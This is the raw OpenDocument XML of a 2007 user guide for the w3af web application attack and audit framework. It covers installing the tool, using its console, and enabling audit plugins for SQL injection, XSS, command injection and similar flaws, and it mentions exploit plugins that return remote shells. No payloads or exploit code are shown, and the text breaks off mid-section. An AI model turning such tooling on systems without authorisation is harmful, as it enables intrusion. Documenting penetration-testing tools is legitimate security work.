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12"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3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in"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5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P16"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8"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9"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1"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3"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4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Nimbus Mono L"/>
    </style:style>
    <style:style style:name="P25"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6"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7"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0835in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in"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3"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4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P35"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text-properties style:font-name="Bitstream Vera Sans1"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align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Nimbus Mono L"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>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1"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2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false"/>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Heading_20_2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>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3"/>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6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>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6"/>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6"/>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P85"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6"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7"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8" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Nimbus Mono L" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L15">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L17">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L17">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Bitstream Vera Sans1"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L17">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:paragraph-properties fo:margin-left="0.4925in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0.0835in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Nimbus Mono L"/>
    </style:style>
    <style:style style:name="P95"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96"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97"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98"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99"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00"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1"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2"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3"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04"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05"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06"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07"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08"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09"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10"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11"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12"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13"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14"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15"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16"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17"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18"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19"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20"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21"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22"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23"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24"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25"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26"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27"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28"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29"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2</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October 15, 2007</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Introduction <text:tab/>3</text:p>
          <text:p text:style-name="P53">Installation<text:tab/>3</text:p>
          <text:p text:style-name="P54">Requirements<text:tab/>3</text:p>
          <text:p text:style-name="P53">w3af phases<text:tab/>4</text:p>
          <text:p text:style-name="P53">Running w3af<text:tab/>4</text:p>
          <text:p text:style-name="P54">Plugins<text:tab/>8</text:p>
          <text:p text:style-name="P54">Plugin configuration<text:tab/>8</text:p>
          <text:p text:style-name="P53">Starting a scan<text:tab/>13</text:p>
          <text:p text:style-name="P54">A complete session<text:tab/>13</text:p>
          <text:p text:style-name="P53">A warning about discovery<text:tab/>16</text:p>
          <text:p text:style-name="P54">When everything else fails...<text:tab/>17</text:p>
          <text:p text:style-name="P53">w3af scripts<text:tab/>17</text:p>
          <text:p text:style-name="P53">The Output<text:tab/>19</text:p>
          <text:p text:style-name="P53">Complex sites<text:tab/>21</text:p>
          <text:p text:style-name="P53">Exploiting<text:tab/>23</text:p>
          <text:p text:style-name="P54">Advanced exploiting techniques<text:tab/>25</text:p>
          <text:p text:style-name="P54">Virtual daemon<text:tab/>25</text:p>
          <text:p text:style-name="P54">w3afAgent<text:tab/>27</text:p>
          <text:p text:style-name="P53">More information<text:tab/>27</text:p>
          <text:p text:style-name="P53">Bugs<text:tab/>28</text:p>
          <text:p text:style-name="P53">Final words<text:tab/>28</text:p>
        </text:index-body>
      </text:table-of-content>
      <text:p text:style-name="P5"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"/>
      <text:h text:style-name="P7" text:outline-level="2"><text:bookmark text:name="SECTION00200000000000000000"/>Introduction </text:h>
      <text:p text:style-name="P10">This document is a user guide for version 1.0 of the Web Application Attack and Audit Framework ( w3af ), its goal is to provide a basic overview of what the Framework is, how it works and what you can do with it. </text:p>
      <text:p text:style-name="P36">w3af is a complete environment for auditing and attacking web applications. This environment provides a solid platform for auditing and penetration-testing. </text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Installation</text:h>
      <text:p text:style-name="P11">The framework should work on all platforms supported by Python. This user guide will guide you through the installation on a Linux platform, but installation on Windows and OSX is possible and straight forward.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Requirements</text:h>
      <text:p text:style-name="P9">The framework has the following requirements:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P79">fpconst-0.7.2</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">pygoogle</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">pywordnet</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">SOAPpy</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">pyPdf</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">Beautiful Soup</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">The first five requirements are bundled with the distribution file “w3af-<text:bookmark text:name="line1"/>&lt;version&gt;</text:p>
      <text:p text:style-name="P10">.bzip2”, inside the “extlib” directory. The installation steps for this libraries are ( as root ):</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P39">cd w3af</text:p>
      <text:p text:style-name="P39">cd fpconst-0.7.2</text:p>
      <text:p text:style-name="P39">python setup.py install</text:p>
      <text:p text:style-name="P39">cd ..</text:p>
      <text:p text:style-name="P39">cd pygoogle</text:p>
      <text:p text:style-name="P39">python setup.py install</text:p>
      <text:p text:style-name="P39">cd ..</text:p>
      <text:p text:style-name="P39">cd pywordnet</text:p>
      <text:p text:style-name="P39">python setup.py install</text:p>
      <text:p text:style-name="P39"><text:soft-page-break/>cd ..</text:p>
      <text:p text:style-name="P39">cd SOAPpy</text:p>
      <text:p text:style-name="P39">python setup.py install</text:p>
      <text:p text:style-name="P39">cd pyPdf</text:p>
      <text:p text:style-name="P39">python setup.py install</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">You can also download all the libraries from the corresponding sites and install them from there, the libraries are bundled with w3af for installation ease.</text:p>
      <text:p text:style-name="P10">Utidy and it's requirements should be downloaded and installed following the procedures specified by that project. If you are using a Debian based distribution, you can run “apt-get install python-utidylib” and you are done.</text:p>
      <text:p text:style-name="P9"/>
      <text:h text:style-name="P28" text:outline-level="2">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recursively: If plugin A finds a new URL in the first run, the w3af core will send that URL to plugin B. If plugin B then finds a new URL, it will be sent to plugin A. Thi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text:p>
      <text:p text:style-name="P12">Attack plugins <text:span text:style-name="T2">objective is to exploit vulnerabilities found by audit plugins. They usually return a shell on the remote server, or a dump of remote databases in case of SQL injections.</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:h text:style-name="P29" text:outline-level="2">Running w3af</text:h>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14">w3af has two user interfaces, the consoleUI and the webUI. This user guide will focus on the consoleUI, which is, at the moment of this writing much more tested and complete than the webUI. To fire up the consoleUI you just have to execute w3af without parameters and you will get a prompt like this one:</text:p>
      <text:p text:style-name="P40"><text:soft-page-break/><text:span text:style-name="T3">$</text:span> ./w3af</text:p>
      <text:p text:style-name="P41">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P17">From this prompt you will be able to configure the framework, launch scans and ultimately exploit a vulnerability. At this point you can start typing commands, the first command you have to learn is “help” (Please note that commands are case sensitive) .</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> help</text:p>
      <text:p text:style-name="P40">The following commands are available:</text:p>
      <text:p text:style-name="P40">help <text:s text:c="15"/>You are here. help [command] prints more specific help.</text:p>
      <text:p text:style-name="P40">url-settings <text:s text:c="7"/>Configure the URL opener.</text:p>
      <text:p text:style-name="P40">misc-settings <text:s text:c="6"/>Configure w3af misc settings.</text:p>
      <text:p text:style-name="P40">session <text:s text:c="12"/>Load and save sessions.</text:p>
      <text:p text:style-name="P40">plugins <text:s text:c="12"/>Enable, disable and configure plugins.</text:p>
      <text:p text:style-name="P40">start <text:s text:c="14"/>Start site analysis.</text:p>
      <text:p text:style-name="P40">exploit <text:s text:c="12"/>Exploit a vulnerability.</text:p>
      <text:p text:style-name="P40">tools <text:s text:c="14"/>Enter the tools section.</text:p>
      <text:p text:style-name="P40">target <text:s text:c="13"/>Set the target URL.</text:p>
      <text:p text:style-name="P40">exit <text:s text:c="15"/>Exit w3af.</text:p>
      <text:p text:style-name="P41">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> help target</text:p>
      <text:p text:style-name="P40">Enter the target configuration. Here you will configure the target URL.</text:p>
      <text:p text:style-name="P41">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P17">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tools”.</text:span></text:p>
      <text:p text:style-name="P17">Other interesting things to notice about the consoleUI are the tab completion (type 'plu' and then TAB) and the command history ( after typing some commands, navigate the history with the up and down arrows ).</text:p>
      <text:p text:style-name="P17">To enter a configuration menu, you just have to type it's name and hit enter, you will see how the prompt changes and you are now in that context.</text:p>
      <text:p text:style-name="P40"><text:soft-page-break/><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> url-settings</text:p>
      <text:p text:style-name="P41">w3af/url-settings&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">All the configuration menus provide the following commands:</text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P95">help</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P95">view</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P95">set</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P95">back</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">Here is a usage example of this commands in the url-settings menu:</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af/url-settings&gt;&gt;&gt;</text:span> help</text:p>
      <text:p text:style-name="P40">The following commands are available:</text:p>
      <text:p text:style-name="P40">help <text:s text:c="15"/>You are here. help [command|parameter] prints more specific help.</text:p>
      <text:p text:style-name="P40">set <text:s text:c="16"/>Set a parameter value.</text:p>
      <text:p text:style-name="P40">view <text:s text:c="15"/>List all configuration parameters and current values.</text:p>
      <text:p text:style-name="P40">back <text:s text:c="15"/>Return to previous menu.</text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af/url-settings&gt;&gt;&gt;</text:span> view</text:p>
      <text:p text:style-name="P40">Parameter <text:s text:c="10"/>Value <text:s text:c="14"/>Description</text:p>
      <text:p text:style-name="P40">========= <text:s text:c="10"/>===== <text:s text:c="14"/>===========</text:p>
      <text:p text:style-name="P40">proxyPort <text:s text:c="10"/>8080 <text:s text:c="15"/>Proxy TCP port</text:p>
      <text:p text:style-name="P40">basicAuthDomain <text:s text:c="24"/>Set the basic authentication domain for HTTP requests</text:p>
      <text:p text:style-name="P40">maxFileSize <text:s text:c="8"/>400000 <text:s text:c="13"/>Indicates the maximum file size (in bytes) that w3af will GET/POST.</text:p>
      <text:p text:style-name="P40">headersFile <text:s text:c="28"/>Set the headers filename. This file has additional headers that are added to each request.</text:p>
      <text:p text:style-name="P40">proxyAddress <text:s text:c="27"/>Proxy IP address</text:p>
      <text:p text:style-name="P40">maxRetrys <text:s text:c="10"/>2 <text:s text:c="18"/>Indicates the maximum number of retries when requesting an URL.</text:p>
      <text:p text:style-name="P40">ignoreSessCookies <text:s text:c="2"/>False <text:s text:c="14"/>Ignore session cookies</text:p>
      <text:p text:style-name="P40">timeout <text:s text:c="12"/>10 <text:s text:c="17"/>The timeout for <text:soft-page-break/>connections to the HTTP server</text:p>
      <text:p text:style-name="P40">basicAuthUser <text:s text:c="26"/>Set the basic authentication username for HTTP requests</text:p>
      <text:p text:style-name="P40">userAgent <text:s text:c="10"/>w3af.sourceforge.netUser Agent header</text:p>
      <text:p text:style-name="P40">basicAuthPass <text:s text:c="26"/>Set the basic authentication password for HTTP requests</text:p>
      <text:p text:style-name="P40">cookieJarFile <text:s text:c="26"/>Set the cookiejar filename.</text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af/url-settings&gt;&gt;&gt;</text:span> set timeout 5</text:p>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af/url-settings&gt;&gt;&gt;</text:span> view</text:p>
      <text:p text:style-name="P40">...</text:p>
      <text:p text:style-name="P40">timeout <text:s text:c="12"/>5 <text:s text:c="18"/>The timeout for </text:p>
      <text:p text:style-name="P40">connections to the HTTP server</text:p>
      <text:p text:style-name="P40">...</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P17">To summarize, the “view” command is used to list all parameters, with their values and a description. The set command is used to change the value of a variable. Finally we can execute “back” or press CTRL+C and you will return to the previous menu. A detailed help for every configuration parameter can be obtained using “help parameter” like shown in this example:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P40"><text:span text:style-name="T3">w3af/url-settings&gt;&gt;&gt;</text:span> help timeout</text:p>
      <text:p text:style-name="P40">Help for parameter timeout:</text:p>
      <text:p text:style-name="P40">===========================</text:p>
      <text:p text:style-name="P40">Set low timeouts for LAN use and high timeouts for slow Internet connections.</text:p>
      <text:p text:style-name="P41">w3af/url-settings&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P20">The “url-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text:p>
      <text:p text:style-name="P19"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"/>
      <text:h text:style-name="P8" text:outline-level="3">Plugins</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">Plugins do all the magic. The plugins will find the URLs, discover the bugs and exploit them. So now, we will learn how to configure the plugins. In a previous section I told you that w3af had three types of plugins: discovery, audit and exploit. Well, I actually lied a little because w3af has many other plugins. The complete list of plugins types is:</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P56">discovery</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">audit</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">grep</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">exploit</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">output</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">mangle</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">bruteforce</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P56">evasion</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">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6">Exploit plugins [ab]use the vulnerabilities found in the audit phase and return something useful to the user ( remote shell, SQL table dump, a proxy, etc ).</text:p>
      <text:p text:style-name="P36">Output plugins are the way the framework and the plugins communicate with the user, output plugins save the data to a text or html file. Debugging information is also sent to the plugins and can be saved for analysis.</text:p>
      <text:p text:style-name="P36">Mangle plugins are a way to modify requests and responses based on regular expressions, think “sed (stream editor) for the web”.</text:p>
      <text:p text:style-name="P36">Bruteforce plugins will bruteforce logins, they are actually part of the discovery phase. </text:p>
      <text:p text:style-name="P36">Finally, evasion plugins try to evade simple intrusion detection rules.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Plugin configuration</text:h>
      <text:p text:style-name="P36">The plugins are configured using the “plugins” configuration menu. Lets see how to do that:</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P39"><text:soft-page-break/><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> plugins</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> help</text:p>
      <text:p text:style-name="P39">The following commands are available:</text:p>
      <text:p text:style-name="P39">help <text:s text:c="15"/>You are here. help [command] prints more specific help.</text:p>
      <text:p text:style-name="P39">list <text:s text:c="15"/>List all available plugins.</text:p>
      <text:p text:style-name="P39">audit <text:s text:c="14"/>Enable and configure audit plugins.</text:p>
      <text:p text:style-name="P39">output <text:s text:c="13"/>Enable and configure output plugins.</text:p>
      <text:p text:style-name="P39">discovery <text:s text:c="10"/>Enable and configure discovery plugins.</text:p>
      <text:p text:style-name="P39">grep <text:s text:c="15"/>Enable and configure grep plugins.</text:p>
      <text:p text:style-name="P39">evasion <text:s text:c="12"/>Enable and configure evasion plugins.</text:p>
      <text:p text:style-name="P39">mangle <text:s text:c="13"/>Enable and configure mangle plugins.</text:p>
      <text:p text:style-name="P39">bruteforce <text:s text:c="9"/>Enable and configure bruteforce plugins.</text:p>
      <text:p text:style-name="P39">back <text:s text:c="15"/>Return to previous menu.</text:p>
      <text:p text:style-name="P42">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P22">As you may have noticed, all plugins can be configured here except the exploit plugins, we will talk about them later. The first step to take here is to know the syntax for configuring the plugins, so lets do that:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> help audit</text:p>
      <text:p text:style-name="P44">Enable and configure audit plugins.</text:p>
      <text:p text:style-name="P44">Syntax: audit [config plugin1] [plugin1,plugin2 ... pluginN]</text:p>
      <text:p text:style-name="P44">Example: audit</text:p>
      <text:p text:style-name="P44">Result: All enabled audit plugins are listed.</text:p>
      <text:p text:style-name="P44">Example2: audit plugin1,plugin2</text:p>
      <text:p text:style-name="P44">Result: plugin1 and plugin2 are configured to run</text:p>
      <text:p text:style-name="P44">Example3: audit config plugin1</text:p>
      <text:p text:style-name="P44">Result: Enters to the plugin configuration menu.</text:p>
      <text:p text:style-name="P44">Example4: audit all,!plugin3</text:p>
      <text:p text:style-name="P44">Result: All audit plugins are configured to run except plugin3.</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> help list</text:p>
      <text:p text:style-name="P44">List all available plugins.</text:p>
      <text:p text:style-name="P44"><text:soft-page-break/>Sintax: list {plugin type}</text:p>
      <text:p text:style-name="P44">Example: list audit</text:p>
      <text:p text:style-name="P42">w3af/plugins&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P22">Ok, so w3af is nice enough to tell us how to use it. Now we will see how to enable two plugins and then verify that they are enabled:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit xss, sqli</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit</text:p>
      <text:p text:style-name="P44">Enabled audit plugins:</text:p>
      <text:p text:style-name="P44">xss</text:p>
      <text:p text:style-name="P44">sqli</text:p>
      <text:p text:style-name="P42">w3af/plugins&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P22">By issuing the <text:span text:style-name="T4">“audit xss, sqli”</text:span> command we enable the <text:span text:style-name="T4">“xss”</text:span> and <text:span text:style-name="T4">“sqli”</text:span> plugins to be runned. To see what these plugin do, we could have ran the <text:span text:style-name="T4">“list”</text:span> command like this to get a small description of all plugins:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> list audit</text:p>
      <text:p text:style-name="P44">mxInjection <text:s text:c="8"/>This plugin tests for MX injection bugs.</text:p>
      <text:p text:style-name="P44">unSSL <text:s text:c="14"/>This plugin checks if secure content can also be fetched using http.</text:p>
      <text:p text:style-name="P44">fileUpload <text:s text:c="9"/>This plugin uploads a file and then searches for the file inside all known directories.</text:p>
      <text:p text:style-name="P44">xpath <text:s text:c="14"/>This plugin tests for XPATH injection bugs.</text:p>
      <text:p text:style-name="P44">sslCertificate <text:s text:c="5"/>This plugin checks the SSL certificate validity( if https is being used ).</text:p>
      <text:p text:style-name="P44">htaccessMethods <text:s text:c="4"/>This plugin searches for misconfigurations in the "&lt;LIMIT&gt;" configuration of Apache.</text:p>
      <text:p text:style-name="P44">LDAPi <text:s text:c="14"/>This plugin tests for LDAP injection bugs.</text:p>
      <text:p text:style-name="P44">osCommanding <text:s text:c="7"/>This plugin tests for OS Commanding bugs.</text:p>
      <text:p text:style-name="P44">responseSplitting <text:s text:c="2"/>This plugin tests for response splitting bugs.</text:p>
      <text:p text:style-name="P44">blindSqli <text:s text:c="10"/>This plugin tests for blind SQL injection bugs.</text:p>
      <text:p text:style-name="P44"><text:soft-page-break/>sqli <text:s text:c="15"/>This plugin tests for SQL injection bugs.</text:p>
      <text:p text:style-name="P44">remoteFileInclude <text:s text:c="2"/>This plugin tests for remote file inclusion bugs.</text:p>
      <text:p text:style-name="P44">formatString <text:s text:c="7"/>This plugin tests for format String bugs.</text:p>
      <text:p text:style-name="P44">localFileInclude <text:s text:c="3"/>This plugin tests for local file inclusion bugs.</text:p>
      <text:p text:style-name="P44">xss <text:s text:c="16"/>This plugin tests for XSS.</text:p>
      <text:p text:style-name="P44">ssi <text:s text:c="16"/>This plugin tests for server side inclusion bugs.</text:p>
      <text:p text:style-name="P44">buffOverflow <text:s text:c="7"/>This plugin tests for buffer overflow bugs.</text:p>
      <text:p text:style-name="P44">globalRedirect <text:s text:c="5"/>This plugin tests for scripts that redirect the browser to any site.</text:p>
      <text:p text:style-name="P44">xsrf <text:s text:c="15"/>This plugin tests for the easiest to exploit xsrf vulnerabilities.</text:p>
      <text:p text:style-name="P44">phishingVector <text:s text:c="5"/>This plugin searches for phishing vectors.</text:p>
      <text:p text:style-name="P44">dav <text:s text:c="16"/>This plugin uploads a file and then searches for the file inside all known directories.</text:p>
      <text:p text:style-name="P44">preg_replace <text:s text:c="7"/>This plugin tests for unsafe usage of PHPs preg_replace.</text:p>
      <text:p text:style-name="P42">w3af/plugins&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P30">Or if the user is interested in knowing exactly what a plugin does, he can also run the “<text:span text:style-name="T5">desc” </text:span>command like this:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> plugins</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit desc fileUpload</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">This plugin will try to expoit insecure file upload forms.</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P51"><text:s text:c="15"/>One configurable parameter exists:</text:p>
      <text:p text:style-name="P51"><text:s text:c="24"/>- extensions</text:p>
